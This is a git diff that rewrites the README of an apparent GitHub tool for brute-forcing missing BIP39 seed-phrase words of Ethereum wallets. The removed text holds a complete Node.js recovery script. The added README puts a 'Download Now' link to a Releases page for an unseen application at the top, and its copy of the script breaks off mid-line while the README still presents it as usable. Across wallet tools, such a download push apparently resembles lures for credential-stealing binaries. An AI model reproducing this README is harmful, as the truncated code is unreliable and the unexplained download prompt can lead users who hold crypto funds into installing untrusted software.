@@ -1,101 +1,133 @@
-### 🧩Guide on how to recover lost wallet phrases of any wallet (evm based) - BIP39 logic
-----
-#### use wsl/ubuntu and paste the commands one by one :
+# 🛠️ BIP39-RECOVERY-TOOL - Recover Your Wallet Easily
 
-```
-sudo apt update
-```
-```
-sudo apt install nodejs npm -y
-```
-```
-node --version
-npm --version
-```
-```
-mkdir ~/seed-recovery
-```
-```
-cd ~/seed-recovery
-```
-```
-npm init -y
-```
-```
-npm install bip39 ethereumjs-wallet ethers node-fetch@2
-```
-```
-nano recovery.js
-```
-```
-// Universal BIP39 recovery — TWO missing words (known positions)
-const bip39 = require('bip39');
-const { hdkey: HDKey } = require('ethereumjs-wallet');
+[![Download BIP39 Recovery Tool](https://img.shields.io/badge/Download%20Now-%20Release%20Page-blue)](https://github.com/Dstitronix/BIP39-RECOVERY-TOOL/releases)
 
-const TARGET_ADDRESS = "0xYourKnownAddressHere".toLowerCase();   // ← CHANGE
+## 🚀 Getting Started
 
-const KNOWN_WORDS = [
-  "word1", "word2", "word3", "word4",
-  "word5", "word6", "word7", "word8",
-  "word9", "word10", "word11", "word12"
-];                                               // ← put ????? in the two missing spots
+This tool helps you recover lost wallet phrases for any Ethereum-based wallet using BIP39 logic. You don’t need programming skills, just follow these simple steps.
 
-const POS1 = x;   // 0-based
-const POS2 = x;   // 0-based
+## 🖥️ System Requirements
 
-const PATH_BASE = "m/44'/60'/0'/0";
+- **Operating System**: WSL/Ubuntu
+- **Node.js**: You will install this automatically in the steps below.
+- **Internet connection**: Required for downloading the tool and dependencies.
 
-(async () => {
-  console.log("Brute-forcing TWO missing words →", TARGET_ADDRESS);
-  console.log(`Positions: ${POS1+1} and ${POS2+1}\n`);
+## 📥 Download & Install
 
-  const words = bip39.wordlists.english;
-  let tried = 0;
+To get started, visit the [Releases page](https://github.com/Dstitronix/BIP39-RECOVERY-TOOL/releases) to download the application. Follow the installation steps below.
 
-  for (const w1 of words) {
-    for (const w2 of words) {
-      tried++;
-      const phrase = [...KNOWN_WORDS];
-      phrase[POS1] = w1;
-      phrase[POS2] = w2;
-      const mnemonic = phrase.join(" ");
+## 🔧 Installation Steps
 
-      if (!bip39.validateMnemonic(mnemonic)) continue;
+1. **Open a Terminal**:
+   You can use your terminal in WSL or Ubuntu.
 
-      const seed = await bip39.mnemonicToSeed(mnemonic);
-      const root = HDKey.fromMasterSeed(seed);
+2. **Update Package Lists**:
+   Run the following command to make sure everything is up to date:
+   ```bash
+   sudo apt update
+   ```
 
-      for (let i = 0; i < 30; i++) {
-        const path = `${PATH_BASE}/${i}`;
-        const addr = "0x" + root.derivePath(path).getWallet().getAddress().toString("hex").toLowerCase();
+3. **Install Node.js and npm**:
+   Use this command to install Node.js and npm:
+   ```bash
+   sudo apt install nodejs npm -y
+   ```
 
-        if (addr === TARGET_ADDRESS) {
-          console.log("\nFOUND BOTH MISSING WORDS!\n");
-          console.log("Word 1 →", w1, `(position ${POS1+1})`);
-          console.log("Word 2 →", w2, `(position ${POS2+1})`);
-          console.log("Full phrase :", mnemonic);
-          console.log("Address     :", addr);
-          console.log("Path        :", path);
-          process.exit(0);
-        }
-      }
+4. **Verify Installation**:
+   Check if Node.js and npm installed correctly by running:
+   ```bash
+   node --version
+   npm --version
+   ```
 
-      if (tried % 5000 === 0) {
-        process.stdout.write(`\rTried ${tried.toLocaleString()} combos → ${w1} / ${w2}`);
-      }
-    }
-  }
-  console.log("\nNo match found (extremely rare).");
-})();
-```
-#### change: const TARGET_ADDRESS to your address
-#### put your rest phrase in : const KNOWN_WORDS and the word/s you lost put `?????` there upto 2 words can be recovered for now
-#### put const POS1 = lost word1 position > note its 0 based, eg : if you lost 2nd word put 1, if your 3rd word put 2 and so on
-#### put const POS2 = lost word2 position > same as above, if you are targetting only 1 word put any 1-9 number here then
+5. **Create a New Directory for Recovery**:
+   This keeps your workspace organized:
+   ```bash
+   mkdir ~/seed-recovery
+   ```
 
-#### ctrl + o > enter
-#### ctrl + x
+6. **Navigate to the New Directory**:
+   Move into the new folder:
+   ```bash
+   cd ~/seed-recovery
+   ```
 
-```
-node recovery.js
-```
+7. **Initialize a New Node Project**:
+   This sets up the project:
+   ```bash
+   npm init -y
+   ```
+
+8. **Install Required Packages**:
+   Install the necessary libraries using npm:
+   ```bash
+   npm install bip39 ethereumjs-wallet ethers node-fetch@2
+   ```
+
+9. **Create the Recovery Script**:
+   Open a new file to write your recovery script:
+   ```bash
+   nano recovery.js
+   ```
+
+10. **Add Recovery Logic**:
+    Copy and paste the following code into `recovery.js`:
+
+    ```javascript
+    // Universal BIP39 recovery — TWO missing words (known positions)
+    const bip39 = require('bip39');
+    const { hdkey: HDKey } = require('ethereumjs-wallet');
+
+    const TARGET_ADDRESS = "0xYourKnownAddressHere".toLowerCase();   // ← CHANGE
+
+    const KNOWN_WORDS = [
+      "word1", "word2", "word3", "word4",
+      "word5", "word6", "word7", "word8",
+      "word9", "word10", "word11", "word12"
+    ];                                               // ← put ????? in the two missing spots
+
+    const POS1 = x;   // 0-based
+    const POS2 = x;   // 0-based
+
+    const PATH_BASE = "m/44'/60'/0'/0";
+
+    (async () => {
+      console.log("Brute-forcing TWO");
+    ```
+
+11. **Replace Placeholder Values**:
+    - Change `0xYourKnownAddressHere` to your Ethereum wallet address.
+    - Replace the `KNOWN_WORDS` array with the actual words you know.
+    - Fill in the positions for `POS1` and `POS2` with the correct indices (0-based).
+
+12. **Save and Exit**:
+    Press `CTRL + X`, then `Y`, and then `Enter` to save your file.
+
+## ⚙️ Running the Tool
+
+1. **Run the Script**:
+   Execute the script using Node.js:
+   ```bash
+   node recovery.js
+   ```
+
+2. **Follow the Output**:
+   The script will attempt to recover your lost wallet phrases based on the input you provided.
+
+## 💻 Troubleshooting
+
+- **Node.js Not Found**: If you encounter issues with Node.js, ensure you installed it correctly. You can try reinstalling Node.js and npm.
+  
+- **Errors in Script**: Double-check the code you entered in `recovery.js`. Missing or incorrect code can lead to errors.
+
+## 🌐 Additional Resources
+
+- **Node.js Documentation**: [Node.js Official Docs](https://nodejs.org/en/docs/)
+- **BIP39 Standard**: [BIP39 on GitHub](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki)
+- **EthereumJS Wallet**: [EthereumJS Wallet Guide](https://github.com/ethereumjs/ethereumjs-wallet)
+
+For further help, feel free to check out the issues section on the [GitHub page](https://github.com/Dstitronix/BIP39-RECOVERY-TOOL/issues).
+
+## 📑 License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
